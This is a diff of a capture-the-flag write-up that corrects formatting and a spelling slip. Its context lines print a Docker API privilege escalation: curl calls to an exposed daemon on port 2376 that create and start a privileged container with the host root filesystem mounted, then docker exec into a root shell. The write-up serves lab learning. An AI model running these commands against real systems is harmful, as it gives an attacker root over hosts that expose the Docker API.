@@ -108,10 +108,11 @@ Using the command
 ``` curl –insecure -X POST -H "Content-Type: application/json" http://127.0.0.1:2376/containers/create?name=test -d '{"Image":"sweettoothinc", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}' ```
 
 Returns the id of our container
-```{"Id":"39d4cf768ec3fae31a9af685cefcba1244a351acb88841a5c822e7bceb4009d3","Warnings":null}
+```
+"Id":"39d4cf768ec3fae31a9af685cefcba1244a351acb88841a5c822e7bceb4009d3","Warnings":null
 ```
 
-Now we start the container using
+Now we start the container using the command
 ```
 curl –insecure -X POST -H "Content-Type: application/json" http://127.0.0.1:2376/containers/39d4cf768ec3fae31a9af685cefcba1244a351acb88841a5c822e7bceb4009d3/start?name=test
 ```
@@ -121,7 +122,7 @@ We gain root shell using the command
 docker -H 127.0.0.1:2376 exec -it 39d4cf768ec3 /bin/bash
 ```
 
-And viola we are root now
+And voila we are root now
 
 ```
 root@39d4cf768ec3:/# whoami
